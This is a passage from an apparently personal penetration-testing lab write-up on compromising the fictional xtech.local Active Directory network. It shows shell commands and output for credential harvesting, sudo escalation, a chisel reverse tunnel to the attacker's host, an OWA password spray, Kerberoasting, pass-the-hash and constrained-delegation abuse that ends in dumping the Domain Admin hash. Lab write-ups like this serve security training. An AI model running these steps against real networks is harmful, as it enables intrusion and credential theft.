www-data@web01:/$<span class="w"> </span><span class="nb">export</span><span class="w"> </span><span class="nv">TERM</span><span class="o">=</span>xterm
www-data@web01:/$<span class="w"> </span>^Z<span class="w"> </span><span class="c1"># &lt;-- CRTL + Z</span>

stty<span class="w"> </span>raw<span class="w"> </span>-echo<span class="p">;</span><span class="w"> </span><span class="nb">fg</span><span class="w"> </span><span class="c1"># &lt;-- in local machine</span>

www-data@web01:/$<span class="w"> </span>
</code></pre></div>
<h3 id="pivoting-to-dev01">Pivoting to dev01<a class="headerlink" href="#pivoting-to-dev01" title="Permanent link">&para;</a></h3>
<p>First, let's enumerate the users in this box: </p>
<div class="highlight"><pre><span></span><code>www-data@web01:~/html$<span class="w"> </span>cat<span class="w"> </span>/etc/passwd<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-i<span class="w"> </span><span class="s2">&quot;/bin/bash&quot;</span>
root:x:0:0:root:/root:/bin/bash
dev01:x:1001:1001:devloper,devloper,,:/home/dev01:/bin/bash
</code></pre></div>
<p>From the above command output, we identified that there are two users <code>root</code> and <code>dev01</code>. Next, let's enumerate website files. </p>
<div class="highlight"><pre><span></span><code>www-data@web01:~/html$<span class="w"> </span>ls<span class="w"> </span>-la<span class="w"> </span>
total<span class="w"> </span><span class="m">104</span>
drwxr-xr-x<span class="w"> </span><span class="m">8</span><span class="w"> </span>www-data<span class="w"> </span>www-data<span class="w">  </span><span class="m">4096</span><span class="w"> </span>Dec<span class="w"> </span><span class="m">18</span><span class="w"> </span><span class="m">09</span>:59<span class="w"> </span>.
drwxr-xr-x<span class="w"> </span><span class="m">4</span><span class="w"> </span>dev01<span class="w"> </span>dev01<span class="w">  </span><span class="m">4096</span><span class="w"> </span>Dec<span class="w"> </span><span class="m">17</span><span class="w"> </span><span class="m">23</span>:52<span class="w"> </span>..
drwxr-xr-x<span class="w"> </span><span class="m">2</span><span class="w"> </span>www-data<span class="w"> </span>www-data<span class="w">  </span><span class="m">4096</span><span class="w"> </span>Dec<span class="w"> </span><span class="m">17</span><span class="w"> </span><span class="m">23</span>:52<span class="w"> </span>Admin
-rw-r--r--<span class="w"> </span><span class="m">1</span><span class="w"> </span>www-data<span class="w"> </span>www-data<span class="w">   </span><span class="m">127</span><span class="w"> </span>Dec<span class="w"> </span><span class="m">18</span><span class="w"> </span><span class="m">09</span>:59<span class="w"> </span>config.php
drwxr-xr-x<span class="w"> </span><span class="m">2</span><span class="w"> </span>www-data<span class="w"> </span>www-data<span class="w">  </span><span class="m">4096</span><span class="w"> </span>Dec<span class="w"> </span><span class="m">17</span><span class="w"> </span><span class="m">23</span>:52<span class="w"> </span>css
drwxr-xr-x<span class="w"> </span><span class="m">2</span><span class="w"> </span>www-data<span class="w"> </span>www-data<span class="w">  </span><span class="m">4096</span><span class="w"> </span>Dec<span class="w"> </span><span class="m">17</span><span class="w"> </span><span class="m">23</span>:52<span class="w"> </span>fonts
drwxr-xr-x<span class="w"> </span><span class="m">4</span><span class="w"> </span>www-data<span class="w"> </span>www-data<span class="w">  </span><span class="m">4096</span><span class="w"> </span>Dec<span class="w"> </span><span class="m">17</span><span class="w"> </span><span class="m">23</span>:52<span class="w"> </span>images
-rw-r--r--<span class="w"> </span><span class="m">1</span><span class="w"> </span>www-data<span class="w"> </span>www-data<span class="w"> </span><span class="m">55106</span><span class="w"> </span>Dec<span class="w"> </span><span class="m">18</span><span class="w"> </span><span class="m">09</span>:52<span class="w"> </span>index.html
-rw-r--r--<span class="w"> </span><span class="m">1</span><span class="w"> </span>www-data<span class="w"> </span>www-data<span class="w">   </span><span class="m">612</span><span class="w"> </span>Dec<span class="w"> </span><span class="m">18</span><span class="w"> </span><span class="m">09</span>:04<span class="w"> </span>index.nginx-debian.html
drwxr-xr-x<span class="w"> </span><span class="m">2</span><span class="w"> </span>www-data<span class="w"> </span>www-data<span class="w">  </span><span class="m">4096</span><span class="w"> </span>Dec<span class="w"> </span><span class="m">17</span><span class="w"> </span><span class="m">23</span>:52<span class="w"> </span>js
drwxr-xr-x<span class="w"> </span><span class="m">2</span><span class="w"> </span>www-data<span class="w"> </span>www-data<span class="w">  </span><span class="m">4096</span><span class="w"> </span>Dec<span class="w"> </span><span class="m">17</span><span class="w"> </span><span class="m">23</span>:52<span class="w"> </span>php
-rw-r--r--<span class="w"> </span><span class="m">1</span><span class="w"> </span>www-data<span class="w"> </span>www-data<span class="w">   </span><span class="m">550</span><span class="w"> </span>Dec<span class="w"> </span><span class="m">18</span><span class="w"> </span><span class="m">09</span>:53<span class="w"> </span>upload.php
drwxr-xr-x<span class="w"> </span><span class="m">2</span><span class="w"> </span>www-data<span class="w"> </span>www-data<span class="w">  </span><span class="m">4096</span><span class="w"> </span>Dec<span class="w"> </span><span class="m">23</span><span class="w"> </span><span class="m">21</span>:15<span class="w"> </span>uploads
</code></pre></div>
<p><code>config.php</code> looks interesting. By viewing it is content, we will discover user <code>dev01</code> credentials. </p>
<div class="highlight"><pre><span></span><code>www-data@web01:~/html$<span class="w"> </span>cat<span class="w"> </span>config.php
&lt;?php<span class="w"> </span>
<span class="nv">$config</span><span class="o">=</span>array<span class="o">(</span>
<span class="s1">&#39;DB_HOST&#39;</span><span class="o">=</span>&gt;<span class="s1">&#39;localhost&#39;</span>,
<span class="s1">&#39;DB_USERNAME&#39;</span><span class="o">=</span>&gt;<span class="s1">&#39;dev01&#39;</span>,
<span class="s1">&#39;DB_PASSWORD&#39;</span><span class="o">=</span>&gt;<span class="s1">&#39;1337D3v&#39;</span>,
<span class="s1">&#39;DB_DATABASE&#39;</span><span class="o">=</span>&gt;<span class="s1">&#39;xtechDB&#39;</span>
<span class="o">)</span><span class="p">;</span>
?&gt;
</code></pre></div>
<p>Let's verify the discovered credentials if they are valid. We can do this by switching to the user <code>dev01</code> using <code>su</code> command. </p>
<div class="highlight"><pre><span></span><code>www-data@web01:~/html$<span class="w"> </span>su<span class="w"> </span>dev01
Password:<span class="w"> </span>
dev01@web01:/var/www/html$<span class="w"> </span>id<span class="w"> </span>
<span class="nv">uid</span><span class="o">=</span><span class="m">1001</span><span class="o">(</span>dev01<span class="o">)</span><span class="w"> </span><span class="nv">gid</span><span class="o">=</span><span class="m">1001</span><span class="o">(</span>dev01<span class="o">)</span><span class="w"> </span><span class="nv">groups</span><span class="o">=</span><span class="m">1001</span><span class="o">(</span>dev01<span class="o">)</span>
</code></pre></div>
<h3 id="privilege-escalation">Privilege Escalation<a class="headerlink" href="#privilege-escalation" title="Permanent link">&para;</a></h3>
<p>In active directory PT, it is not necessary to gain root privileges in the Linux machines we can utilize that compromised Linux box to pivot into other machines in the same network. For learning purpose, we can try to escalate our privileges into root. First, checking the sudo rights of the current user. </p>
<div class="highlight"><pre><span></span><code>dev01@web01:/var/www/html$<span class="w"> </span>sudo<span class="w"> </span>-l<span class="w"> </span>
<span class="o">[</span>sudo<span class="o">]</span><span class="w"> </span>password<span class="w"> </span><span class="k">for</span><span class="w"> </span>dev01:<span class="w"> </span>
Matching<span class="w"> </span>Defaults<span class="w"> </span>entries<span class="w"> </span><span class="k">for</span><span class="w"> </span>dev01<span class="w"> </span>on<span class="w"> </span>localhost:
<span class="w">    </span>env_reset,<span class="w"> </span>mail_badpass,
<span class="w">    </span><span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin

User<span class="w"> </span>dev01<span class="w"> </span>may<span class="w"> </span>run<span class="w"> </span>the<span class="w"> </span>following<span class="w"> </span>commands<span class="w"> </span>on<span class="w"> </span>localhost:
<span class="w">    </span><span class="o">(</span>ALL<span class="w"> </span>:<span class="w"> </span>ALL<span class="o">)</span><span class="w"> </span>ALL
</code></pre></div>
<p>From the command output, we can identify that the user can run any commands with root privileges. We can abuse this by simply running the command <code>su</code> to switch to root. </p>
<div class="highlight"><pre><span></span><code>dev01@web01:/var/www/html$<span class="w"> </span>sudo<span class="w"> </span>su
root@web01:/var/www/html#<span class="w"> </span>id
<span class="nv">uid</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span><span class="w"> </span><span class="nv">gid</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span><span class="w"> </span><span class="nv">groups</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span>
</code></pre></div>
<p>Now we are root. Checking root directory will reveal for us a log file that contain a password. </p>
<div class="highlight"><pre><span></span><code>root@web01:~#<span class="w"> </span>ls
auth.log<span class="w">  </span>snap
root@web01:~#<span class="w"> </span>cat<span class="w"> </span>auth.log
Nov<span class="w"> </span><span class="m">17</span><span class="w"> </span><span class="m">15</span>:08:39<span class="w"> </span>localhost<span class="w"> </span>sshd<span class="o">[</span><span class="m">621893</span><span class="o">]</span>:<span class="w"> </span>Access<span class="w"> </span>from<span class="w"> </span>mail01
Nov<span class="w"> </span><span class="m">17</span><span class="w"> </span><span class="m">15</span>:08:39<span class="w"> </span>localhost<span class="w"> </span>sshd<span class="o">[</span><span class="m">621893</span><span class="o">]</span>:<span class="w"> </span>Enter<span class="w"> </span>password:
Nov<span class="w"> </span><span class="m">17</span><span class="w"> </span><span class="m">15</span>:08:39<span class="w"> </span>localhost<span class="w"> </span>sshd<span class="o">[</span><span class="m">621893</span><span class="o">]</span>:<span class="w"> </span>P@ssw0rd!
Nov<span class="w"> </span><span class="m">17</span><span class="w"> </span><span class="m">15</span>:09:12<span class="w"> </span>localhost<span class="w"> </span>sshd<span class="o">[</span><span class="m">621893</span><span class="o">]</span>:<span class="w"> </span>Login<span class="w"> </span>successfull
</code></pre></div>
<div class="admonition info">
<p class="admonition-title">Info</p>
<p>It is hard to find similar scenario in real life, I made it basic in order to focus in Active Directory part and cover all the steps in Pentesting.  </p>
</div>
<h2 id="mail01">Mail01<a class="headerlink" href="#mail01" title="Permanent link">&para;</a></h2>
<h3 id="pivot-to-mail01">Pivot to Mail01<a class="headerlink" href="#pivot-to-mail01" title="Permanent link">&para;</a></h3>
<p>The previously discover log file disclose the host <strong>Mail01</strong> in order to find it is IP address simply ping the host.</p>
<div class="highlight"><pre><span></span><code>root@web01:~#<span class="w"> </span>ping<span class="w"> </span>-c<span class="w"> </span><span class="m">3</span><span class="w"> </span>mail01
PING<span class="w"> </span>mail01.xtech.local<span class="w"> </span><span class="o">(</span><span class="m">10</span>.10.10.10<span class="o">)</span><span class="w"> </span><span class="m">56</span><span class="o">(</span><span class="m">84</span><span class="o">)</span><span class="w"> </span>bytes<span class="w"> </span>of<span class="w"> </span>data.
<span class="m">64</span><span class="w"> </span>bytes<span class="w"> </span>from<span class="w"> </span>mail01.xtech.local<span class="w"> </span><span class="o">(</span><span class="m">10</span>.10.10.10<span class="o">)</span>:<span class="w"> </span><span class="nv">icmp_seq</span><span class="o">=</span><span class="m">1</span><span class="w"> </span><span class="nv">ttl</span><span class="o">=</span><span class="m">128</span><span class="w"> </span><span class="nv">time</span><span class="o">=</span><span class="m">0</span>.446<span class="w"> </span>ms
<span class="m">64</span><span class="w"> </span>bytes<span class="w"> </span>from<span class="w"> </span>mail01.xtech.local<span class="w"> </span><span class="o">(</span><span class="m">10</span>.10.10.10<span class="o">)</span>:<span class="w"> </span><span class="nv">icmp_seq</span><span class="o">=</span><span class="m">2</span><span class="w"> </span><span class="nv">ttl</span><span class="o">=</span><span class="m">128</span><span class="w"> </span><span class="nv">time</span><span class="o">=</span><span class="m">0</span>.345<span class="w"> </span>ms
<span class="m">64</span><span class="w"> </span>bytes<span class="w"> </span>from<span class="w"> </span>mail01.xtech.local<span class="w"> </span><span class="o">(</span><span class="m">10</span>.10.10.10<span class="o">)</span>:<span class="w"> </span><span class="nv">icmp_seq</span><span class="o">=</span><span class="m">3</span><span class="w"> </span><span class="nv">ttl</span><span class="o">=</span><span class="m">128</span><span class="w"> </span><span class="nv">time</span><span class="o">=</span><span class="m">0</span>.314<span class="w"> </span>ms

---<span class="w"> </span>mail01.xtech.local<span class="w"> </span>ping<span class="w"> </span>statistics<span class="w"> </span>---
<span class="m">3</span><span class="w"> </span>packets<span class="w"> </span>transmitted,<span class="w"> </span><span class="m">3</span><span class="w"> </span>received,<span class="w"> </span><span class="m">0</span>%<span class="w"> </span>packet<span class="w"> </span>loss,<span class="w"> </span><span class="nb">time</span><span class="w"> </span>2023ms
</code></pre></div>
<p>We identified the IP address of <strong>Mail01</strong> host which is <code>10.10.10.10</code>. As we don't have access into the internal network (<code>10.0.0.0</code>) we will use <code>chisel</code> to pivot into the internal network. To utilize <code>chisel</code> we execute the following commands: </p>
<ul>
<li>
<p>Download <code>chisel</code> from this <a href="https://github.com/jpillora/chisel">repo</a></p>
</li>
<li>
<p>Transfer chisel to the target machine, to do this run:</p>
</li>
</ul>
<div class="highlight"><pre><span></span><code><span class="c1"># In local, machine open Python HTTP server</span>
python3<span class="w"> </span>-m<span class="w"> </span>http.server<span class="w"> </span><span class="m">9002</span>
<span class="c1"># In the target machine, download chisel</span>
wget<span class="w"> </span>http://ip:9001/chisel
<span class="c1"># Also don&#39;t forget to make chisel binary executable</span>
chmod<span class="w"> </span>+x<span class="w"> </span>chisel
</code></pre></div>
<ul>
<li>Start <code>chisel</code> server in your local machine: </li>
</ul>
<div class="highlight"><pre><span></span><code>sudo<span class="w"> </span>chisel<span class="w"> </span>server<span class="w"> </span>-p<span class="w"> </span><span class="m">9003</span><span class="w"> </span>--reverse
</code></pre></div>
<ul>
<li>Run the client from the target machine. Use the flag <code>R:socks</code> to make use of Socks proxy: </li>
</ul>
<div class="highlight"><pre><span></span><code>./chisel<span class="w"> </span>client<span class="w"> </span>ip:9003<span class="w"> </span>R:socks
</code></pre></div>
<p><img alt="" src="../osint_into_da.assets/image-20211223143134007.png" /></p>
<h3 id="password-spray">Password Spray<a class="headerlink" href="#password-spray" title="Permanent link">&para;</a></h3>
<p>Lets's check if we can access <strong>Mail01</strong> host from the web browser. Before we do that, setup socks5 proxy to do this install <code>foxyproxy</code> Firefox plugin. Then, add the following configuration: </p>
<p><img alt="" src="../osint_into_da.assets/image-20211223145831690.png" /></p>
<p>Now browse <strong>Mail01</strong> website. </p>
<p><img alt="" src="../osint_into_da.assets/image-20211223150158063.png" /></p>
<p>It seems host running Outlook Web App (OWA). If we go back to OSINT stage, we discovered three email addresses. Furthermore, we discover a log file in <strong>Web01</strong> that containing a conversation of two users one of them shared their password. With this known, we can now attempt to use that password to conduct a password spray against the collected email addresses. Here we will use <code>SprayingToolKit</code> it can be downloaded from the following <a href="https://github.com/byt3bl33d3r/SprayingToolkit">repository</a>.</p>
<p>Now let's conduct password spray attack, before that we have to configure <code>proxychains</code>. </p>
<ul>
<li>Make sure <code>proxychains</code> configuration file pointed to Socks5 proxy (<code>127.0.0.1:1080</code>).  The configuration file should be ending with the following line <code>socks5   127.0.0.1 1080</code> </li>
</ul>
<div class="highlight"><pre><span></span><code>tac<span class="w"> </span>/etc/proxychains.conf<span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-n<span class="w"> </span><span class="m">1</span>
socks5<span class="w">    </span><span class="m">127</span>.0.0.1<span class="w"> </span><span class="m">1080</span>
</code></pre></div>
<p>Now run <code>atomizer</code> with the following flags: </p>
<div class="highlight"><pre><span></span><code>proxychains<span class="w"> </span>-q<span class="w"> </span>python3<span class="w"> </span>atomizer.py<span class="w"> </span>owa<span class="w"> </span><span class="s1">&#39;https://10.10.10.10/autodiscover/autodiscover.xml&#39;</span><span class="w"> </span><span class="s1">&#39;P@ssw0rd!&#39;</span><span class="w"> </span>emails.txt
</code></pre></div>
<p><img alt="" src="../osint_into_da.assets/image-20211223152953726.png" /></p>
<p>We found one valid credentials <strong>lonnie.hill</strong> with password <code>P@ssw0rd!</code>. Let's use it to login into his mailbox. </p>
<p><img alt="" src="../osint_into_da.assets/image-20211223153248402.png" /></p>
<h3 id="enumerate-lonnies-mailbox">Enumerate Lonnie's Mailbox<a class="headerlink" href="#enumerate-lonnies-mailbox" title="Permanent link">&para;</a></h3>
<p>First thing that we will notice an email sent by the user <strong>Bob.Baker</strong>, this email contain the following: </p>
<p><img alt="" src="../osint_into_da.assets/image-20211223153526970.png" /></p>
<p>As seen in above screenshot, we obtained domain user <strong>Bob.baker</strong> password which is <code>P@ssw0rd@21</code>. </p>
<h3 id="enumerate-the-domain-controller">Enumerate the Domain Controller<a class="headerlink" href="#enumerate-the-domain-controller" title="Permanent link">&para;</a></h3>
<p>With two valid users on the domain, we can now run <a href="https://github.com/BloodHoundAD/BloodHound">BloodHound</a> to get dump of domain controller objects and permissions. I prefer to run BloodHound from Windows host, however, bloodhound can be run from Kali Linux using <a href="https://github.com/fox-it/BloodHound.py">Python collector</a> but it will not give us all attack paths. </p>
<ul>
<li>Windows:</li>
</ul>
<div class="highlight"><pre><span></span><code>runas<span class="w"> </span>/netonly<span class="w"> </span>/user:xtech.local<span class="se">\b</span>ob.baker<span class="w"> </span>cmd
P@ssw0rd@21

.<span class="se">\b</span>loodhound.exe<span class="w"> </span>--collectionmethod<span class="w"> </span>all
</code></pre></div>
<ul>
<li>Linux: </li>
</ul>
<div class="highlight"><pre><span></span><code>bloodhound-python<span class="w"> </span>-c<span class="w"> </span>ALL<span class="w"> </span>-u<span class="w"> </span>bob.baker<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;P@ssw0rd@21&#39;</span><span class="w"> </span>-d<span class="w"> </span>xtech.local<span class="w"> </span>-dc<span class="w"> </span><span class="m">10</span>.10.10.10
</code></pre></div>
<p>After collecting Domain Controller objects run BloodHound. Search for the user <strong>Bob.Baker</strong> and inspect his attributes.</p>
<p><img alt="" src="../osint_into_da.assets/image-20211223160023416.png" /></p>
<p>If we inspected his outbound control rights, we will notice that the user <code>bob.baker</code> have <strong>Generic Write</strong> privileges on the service account <strong>ExchSVC</strong></p>
<p><img alt="" src="../osint_into_da.assets/image-20211223160145144.png" /></p>
<h2 id="pivot-to-exchsvc">Pivot to ExchSVC<a class="headerlink" href="#pivot-to-exchsvc" title="Permanent link">&para;</a></h2>
<h3 id="abusing-generic-write-privileges">Abusing Generic Write Privileges<a class="headerlink" href="#abusing-generic-write-privileges" title="Permanent link">&para;</a></h3>
<p>BloodHound contains handy feature, which is we can see the methodology of abusing every ACL/privileges. We can view this if we hover over the link between object and clicked Help. </p>
<p><img alt="" src="../osint_into_da.assets/image-20211223160244741.png" /></p>
<p><img alt="" src="../osint_into_da.assets/image-20211223160538157.png" /></p>
<ul>
<li>Now how we can abuse <strong>Generic Write</strong> privileges? simply we can add Service Principle Name (SPN) attribute to the account <strong>ExchSVC</strong>. </li>
</ul>
<div class="admonition abstract">
<p class="admonition-title">Service Principal Name (SPN)</p>
<p>The SPN is unique identifier for the network Controller service instance, which is used by Kerberos authentication to associate a service instance with a service login account. </p>
</div>
<p>Adding SPN attributes can be utilize using <a href="https://github.com/dirkjanm/krbrelayx">krbrelayx</a>'s <code>add-spn.py</code> tool. The following commands will be used: </p>
<ul>
<li>First add SPN attribute to the service account ExchSVC: </li>
</ul>
<div class="highlight"><pre><span></span><code>proxychains<span class="w"> </span>python3<span class="w"> </span>addspn.py<span class="w"> </span><span class="m">10</span>.10.10.12<span class="w"> </span>-u<span class="w"> </span>xtech.local<span class="se">\\</span>bob.baker<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;P@ssw0rd@21&#39;</span><span class="w"> </span>-t<span class="w"> </span>exchsvc<span class="w"> </span>-s<span class="w"> </span>cifs/mail01.xtech.local<span class="w">  </span>
</code></pre></div>
<ul>
<li>Then request SPN account TGT: </li>
</ul>
<div class="highlight"><pre><span></span><code>proxychains<span class="w"> </span>impacket-GetUserSPNs<span class="w"> </span>xtech.local/bob.baker:<span class="s1">&#39;P@ssw0rd@21&#39;</span><span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">10</span>.10.10.12<span class="w"> </span>-request
</code></pre></div>
<p><img alt="" src="../osint_into_da.assets/image-20211223163718738.png" /></p>
<p><img alt="" src="../osint_into_da.assets/image-20211223163754911.png" /></p>
<p>The following TGT will be retrieved: </p>
<p><img alt="" src="../osint_into_da.assets/image-20211223163817942.png" /></p>
<p>The retrieved TGT can be crack using <code>hashcat</code>, let's attempt to crack it using <code>fasttrack.txt</code> wordlist</p>
<div class="highlight"><pre><span></span><code>hashcat<span class="w"> </span>-a<span class="w"> </span><span class="m">0</span><span class="w"> </span>-m<span class="w"> </span><span class="m">13100</span><span class="w"> </span>spn.txt<span class="w"> </span>/usr/share/wordlists/fasttrack.txt<span class="w"> </span>--force
</code></pre></div>
<p><img alt="" src="../osint_into_da.assets/image-20211223164636380.png" /></p>
<p>We obtained password for the service account <strong>ExchSVC</strong>. We discovered also he is a local admin in the host web01</p>
<p><img alt="" src="../osint_into_da.assets/image-20211223164816090.png" /></p>
<p>While we are having local admin privileges lets try to dump saved passwords from the LSA memory.  </p>
<p><img alt="" src="../osint_into_da.assets/image-20211223165159002.png" /></p>
<p>No we have <strong>SQLSVC</strong> NTLM hash! now we can authenticate into any host using <a href="https://www.hackingarticles.in/lateral-movement-pass-the-hash-attack/">pass the hash technique</a>. </p>
<h2 id="dc01">DC01<a class="headerlink" href="#dc01" title="Permanent link">&para;</a></h2>
<h3 id="abuse-constrained-delegation">Abuse Constrained Delegation<a class="headerlink" href="#abuse-constrained-delegation" title="Permanent link">&para;</a></h3>
<div class="admonition abstract">
<p class="admonition-title">Constrained Delegation</p>
<p>Constrained delegation allows an object (user/machine) to autheneticate as any user to specfic services. Means object with constrained delegation privileges can impersonate any domain user (including Domain Admins) to specific service in the target host.</p>
</div>
<p>Going back into BloodHound, if we enumerate <strong>SQLSVC</strong> account, we will notice that the service account <strong>SQLSVC</strong> have constrained  delegation privileges on the host <strong>DC01</strong>. </p>
<p><img alt="" src="../osint_into_da.assets/image-20211226124606191.png" /></p>
<p>By abusing constrained delegation privileges we can impersonate the Domain Admin to authenticate on the <strong>DC01</strong>, but first we have to know which service <strong>SQLSVC</strong> is allowed to delegate. This can be done either from <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1">Powerview</a>'s <code>Get-NetUser</code> or from BloodHound.  </p>
<p><img alt="" src="../osint_into_da.assets/image-20211226142625225.png" /></p>
<p>So the account <strong>SQLSVC</strong> are allowed to delegate to the service <code>WWW/DC01</code>, we will use this service to impersonate the Domain Admin. Impacket contains a great tool called <code>getST</code> that can request a ticket. </p>
<div class="highlight"><pre><span></span><code>proxychains<span class="w"> </span>impacket-getST<span class="w">  </span>-impersonate<span class="w"> </span>administrator<span class="w"> </span>-spn<span class="w"> </span>WWW/dc01.xtech.local<span class="w"> </span>xtech.local/SQLSVC<span class="w"> </span>-hashes<span class="w"> </span>:5e76ca700abd3597ab702c0b52bacad2<span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">10</span>.10.10.12<span class="w"> </span>
Impacket<span class="w"> </span>v0.9.23.dev1+20210315.121412.a16198c3<span class="w"> </span>-<span class="w"> </span>Copyright<span class="w"> </span><span class="m">2020</span><span class="w"> </span>SecureAuth<span class="w"> </span>Corporation

<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Getting<span class="w"> </span>TGT<span class="w"> </span><span class="k">for</span><span class="w"> </span>user
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Impersonating<span class="w"> </span>Administrator
<span class="o">[</span>*<span class="o">]</span><span class="w">     </span>Requesting<span class="w"> </span>S4U2self
<span class="o">[</span>*<span class="o">]</span><span class="w">     </span>Requesting<span class="w"> </span>S4U2Proxy
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Saving<span class="w"> </span>ticket<span class="w"> </span><span class="k">in</span><span class="w"> </span>Administrator.ccache
</code></pre></div>
<p>Then, we will store the TGT into the variable <code>KRB5CCNAME</code>. </p>
<div class="highlight"><pre><span></span><code><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>administrator.ccache
</code></pre></div>
<p>Finally, let's dump the Domain Admin NTLM hash using <code>Secretdump</code>  </p>
<div class="highlight"><pre><span></span><code>proxychains<span class="w"> </span>-q<span class="w"> </span>impacket-secretsdump<span class="w"> </span>-k<span class="w"> </span>-no-pass<span class="w"> </span>dc01.xtech.local<span class="w">  </span>-just-dc-user<span class="w"> </span>administrator<span class="w">  </span>
Impacket<span class="w"> </span>v0.9.24<span class="w"> </span>-<span class="w"> </span>Copyright<span class="w"> </span><span class="m">2021</span><span class="w"> </span>SecureAuth<span class="w"> </span>Corporation

<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Dumping<span class="w"> </span>Domain<span class="w"> </span>Credentials<span class="w"> </span><span class="o">(</span>domain<span class="se">\u</span>id:rid:lmhash:nthash<span class="o">)</span>
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Using<span class="w"> </span>the<span class="w"> </span>DRSUAPI<span class="w"> </span>method<span class="w"> </span>to<span class="w"> </span>get<span class="w"> </span>NTDS.DIT<span class="w"> </span>secrets
xtech.local<span class="se">\A</span>dministrator:500:aad3b435b51404eeaad3b435b51404ee:f7b8c850b103fd71e2d60fbe19d1e373:::
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Cleaning<span class="w"> </span>up...<span class="w"> </span>
</code></pre></div>
<p>The attack works, we have impersonated the Domain Admin and dump it is NTLM hash now we have access into the xtech network. </p>
<p><img alt="" src="../osint_into_da.assets/image-20211226141754470.png" /></p>
<p>We can execute commands as Domain Admin.</p>
<p><img alt="" src="../osint_into_da.assets/image-20211226141954753.png" /></p>
<p>Or even login via RDP. </p>
<p><img alt="" src="../osint_into_da.assets/image-20211226142444553.png" /></p>
<p>Now we compromised the Xtech network domain controller and we full access in the infrastructure.  </p>
<h2 id="references">References<a class="headerlink" href="#references" title="Permanent link">&para;</a></h2>
<ol>
<li><a href="https://www.thehacker.recipes/ad/movement/kerberos/delegations/constrained">https://www.thehacker.recipes/ad/movement/kerberos/delegations/constrained</a></li>
<li><a href="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces">https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces</a></li>
<li><a href="https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html">https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html</a></li>
<li><a href="https://book.hacktricks.xyz/windows/active-directory-methodology">https://book.hacktricks.xyz/windows/active-directory-methodology</a></li>
</ol>





                
              </article>
            </div>
          
          
  <script>var tabs=__md_get("__tabs");if(Array.isArray(tabs))e:for(var set of document.querySelectorAll(".tabbed-set")){var tab,labels=set.querySelector(".tabbed-labels");for(tab of tabs)for(var label of labels.getElementsByTagName("label"))if(label.innerText.trim()===tab){var input=document.getElementById(label.htmlFor);input.checked=!0;continue e}}</script>

        </div>
        
      </main>
      
        <footer class="md-footer">
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
    <div class="md-copyright__highlight">
      Mohammed Al Kalbani. &copy; 2022
    </div>
  
  
</div>
      
        <div class="md-social">
  
    
    
      
      
    
    <a href="https://kf0k.github.io" target="_blank" rel="noopener" title="kf0k.github.io" class="md-social__link">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.2.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 